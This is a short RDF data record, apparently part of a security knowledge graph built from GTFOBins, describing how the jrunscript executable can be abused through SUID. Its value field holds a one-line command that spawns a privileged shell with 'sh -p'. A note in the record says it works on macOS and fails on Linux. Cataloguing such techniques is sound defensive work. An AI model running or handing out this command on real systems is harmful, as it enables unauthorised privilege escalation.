    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This has been found working in macOS but failing on Linux systems." ;
    d3f:uses mknd:executable_jrunscript ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_jrunscript ;
    mknd:provides mknd:function_suid ;
    mknd:value "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"" .

